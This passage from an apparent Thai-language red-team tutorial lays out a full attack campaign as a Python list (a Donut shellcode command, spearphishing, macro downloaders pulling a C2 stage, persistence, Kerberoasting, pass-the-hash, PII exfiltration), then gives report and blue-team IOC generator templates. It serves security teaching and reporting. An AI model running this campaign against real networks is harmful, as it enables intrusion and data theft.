            'python3 donut.py -f payload.bin -o shellcode.bin',  # Donut shellcode
        ]
    },
    {
        'phase': 'Initial Access',
        'step': 3,
        'technique': 'Spearphishing Email',
        'objective': 'Send targeted phishing to employees',
        'indicators': [
            'Email from lookalike domain',
            'Attachment: Invoice_2024.doc',
            'Link to: sharepoint-company[.]com/document'
        ]
    },
    {
        'phase': 'Execution',
        'step': 4,
        'technique': 'User opens malicious document',
        'commands': [
            'Macro executes PowerShell downloader',
            'Download and execute stage 2 from C2',
            'Beacon establishes connection back',
        ]
    },
    {
        'phase': 'Persistence',
        'step': 5,
        'technique': 'Multiple persistence mechanisms',
        'commands': [
            'Registry Run Key',
            'Scheduled Task (daily at 9am)',
            'WMI Event Subscription',
        ]
    },
    {
        'phase': 'Privilege Escalation',
        'step': 6,
        'technique': 'Local admin -> Domain Admin',
        'commands': [
            'PrintSpoofer for SYSTEM',
            'Kerberoasting service accounts',
            'BloodHound path to DA',
            'ACL abuse: WriteDACL on Domain Admins group',
        ]
    },
    {
        'phase': 'Lateral Movement',
        'step': 7,
        'technique': 'Move to critical systems',
        'commands': [
            'Pass-the-Hash to servers',
            'PSExec to HR server',
            'WMI to Finance workstation',
        ]
    },
    {
        'phase': 'Actions on Objectives',
        'step': 8,
        'technique': 'Achieve campaign goals',
        'objectives': [
            'Access financial database',
            'Exfiltrate customer PII',
            'Capture DC credentials',
            'Demonstrate crown jewel access',
        ]
    }
]

for step_info in FULL_CAMPAIGN_STEPS:
    print(f"\n{'='*60}")
    print(f"Phase {step_info['step']}: {step_info['phase']}")
    print(f"Technique: {step_info['technique']}")
    print(f"Objective: {step_info.get('objective', step_info.get('objectives', []))}")
    if 'commands' in step_info:
        print("Commands/Actions:")
        for cmd in step_info['commands']:
            print(f"  - {cmd}")
```

---

## 10. Red Team Reporting

### Executive Report Template

```python
#!/usr/bin/env python3
# red_team_report.py - สร้างรายงาน Red Team

from dataclasses import dataclass, field
from typing import List, Dict
from datetime import datetime

@dataclass
class RedTeamFinding:
    title: str
    severity: str  # Critical/High/Medium/Low
    mitre_technique: str
    description: str
    evidence: str
    impact: str
    detection_time: str  # None = ไม่ถูกตรวจจับ
    remediation: str

@dataclass
class RedTeamReport:
    client: str
    engagement_type: str
    start_date: datetime
    end_date: datetime
    objectives: List[str]
    objectives_achieved: List[str]
    findings: List[RedTeamFinding]
    iocs: List[str]  # Indicators of Compromise
    
    def generate_executive_summary(self) -> str:
        achieved_pct = len(self.objectives_achieved) / len(self.objectives) * 100
        detected_findings = [f for f in self.findings if f.detection_time != 'Not detected']
        
        return f"""
=== EXECUTIVE SUMMARY ===
Client: {self.client}
Engagement: {self.engagement_type}
Period: {self.start_date.strftime('%Y-%m-%d')} to {self.end_date.strftime('%Y-%m-%d')}

KEY METRICS:
- Objectives Achieved: {len(self.objectives_achieved)}/{len(self.objectives)} ({achieved_pct:.0f}%)
- Total Findings: {len(self.findings)}
  - Critical: {len([f for f in self.findings if f.severity=='Critical'])}
  - High: {len([f for f in self.findings if f.severity=='High'])}
  - Medium: {len([f for f in self.findings if f.severity=='Medium'])}
  - Low: {len([f for f in self.findings if f.severity=='Low'])}
- Detection Rate: {len(detected_findings)}/{len(self.findings)} findings detected ({len(detected_findings)/len(self.findings)*100:.0f}%)
- Dwell Time: {(self.end_date - self.start_date).days} days in environment

CRITICAL OBJECTIVES ACHIEVED:
{chr(10).join(f'  [x] {o}' for o in self.objectives_achieved)}

OBJECTIVES NOT ACHIEVED:
{chr(10).join(f'  [ ] {o}' for o in self.objectives if o not in self.objectives_achieved)}
"""
    
    def generate_attack_narrative(self) -> str:
        return """
=== ATTACK NARRATIVE ===

Day 1-3: Reconnaissance
  The team conducted passive and active reconnaissance...

Day 4-5: Initial Access
  Using targeted spearphishing emails...

Day 6-10: Privilege Escalation
  After gaining initial foothold...

Day 11-15: Lateral Movement
  With domain credentials obtained...

Day 16-20: Actions on Objectives
  The team achieved all primary objectives...
"""
    
    def generate_remediation_roadmap(self) -> str:
        critical_findings = [f for f in self.findings if f.severity in ['Critical', 'High']]
        
        roadmap = "=== REMEDIATION ROADMAP ===\n"
        roadmap += "\nImmediate Actions (0-30 days):\n"
        for f in critical_findings:
            roadmap += f"  - {f.title}: {f.remediation}\n"
        
        roadmap += "\nShort-term (30-90 days):\n"
        for f in [x for x in self.findings if x.severity == 'Medium']:
            roadmap += f"  - {f.title}: {f.remediation}\n"
        
        roadmap += "\nLong-term (90+ days):\n"
        roadmap += "  - Security Awareness Training\n"
        roadmap += "  - Purple Team Exercises\n"
        roadmap += "  - Detection Engineering\n"
        
        return roadmap
```

### IOC Generation for Blue Team

```python
#!/usr/bin/env python3
# ioc_generator.py - สร้าง IOCs สำหรับ Blue Team

import hashlib
import datetime
import json
from typing import List, Dict

def generate_ioc_report(engagement_id: str) -> Dict:
    """สร้างรายงาน IOC สำหรับ Blue Team"""
    return {
        'engagement_id': engagement_id,
        'generated': datetime.datetime.now().isoformat(),
        'network_iocs': {
            'c2_ips': [
                '203.0.113.100',  # เปลี่ยนเป็น C2 IPs จริง
            ],
            'c2_domains': [
                'update-service.company-cdn.com',
            ],
            'c2_urls': [
                'https://update-service.company-cdn.com/api/v2/check',
            ],
            'dns_queries': [
                'update-service.company-cdn.com',
                'beacon.update-service.company-cdn.com',
            ]
        },
        'file_iocs': {
            'hashes': {
                'payload.exe': {
                    'md5': 'aaabbbccc111222333444555666777',
                    'sha256': 'aaabbbccc...full_hash_here',
                },
            },
            'filenames': [
                'Invoice_2024.doc',
                'SecurityUpdate.exe',
                'svchost.exe',  # ใน unusual location
            ],
            'file_paths': [
                'C:\\Users\\%username%\\AppData\\Roaming\\SecurityUpdate\\',
                'C:\\Windows\\Temp\\svchosts.exe',
            ]
        },
        'registry_iocs': [
            'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate',
        ],
        'process_iocs': [
            'powershell.exe parent: winword.exe',
            'cmd.exe spawned by svchost.exe (non-standard path)',
        ],
        'behavioral_iocs': [
            'LSASS memory access from non-system process',
            'Kerberoasting (multiple TGS requests with RC4)',
            'BloodHound queries (LDAP enumeration patterns)',
            'Lateral movement via SMB with compromised credentials',
        ],
        'yara_rules': [
            {
                'name': 'RedTeam_Beacon_Config',
                'rule': """
rule RedTeam_Beacon_Config {
    strings:
        $s1 = "update-service.company-cdn.com" ascii
        $s2 = { 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF }  // MZ header
    condition:
        $s1 and $s2
}
"""
            }
        ]
    }

ioc_report = generate_ioc_report('RT-2024-001')
print(json.dumps(ioc_report, indent=2))
```

---

## สรุป Red Team Operations

| ขั้นตอน | เครื่องมือ | วัตถุประสงค์ |
|----------|---------|----------|
| Recon | Maltego, OSINT tools | เข้าใจเป้าหมาย |
| Phishing | GoPhish, custom | Initial access |
| C2 | Cobalt Strike, Sliver | ควบคุม agents |
| Privilege Escalation | Impacket, CrackMapExec | Domain control |
| Lateral Movement | PsExec, WMI, DCOM | เคลื่อนย้ายเครือข่าย |
| Persistence | Registry, WMI, Tasks | คงอยู่ใน network |
| Exfiltration | DNS, HTTPS, Cloud | ส่งข้อมูลออก |
| Reporting | Custom, Dradis | สื่อสารผลลัพธ์ |

---

← [Part 73: Active Directory Advanced](Part-73-Active-Directory-Advanced.md) | [Part 75: Purple Team](Part-75-Purple-Team.md) →
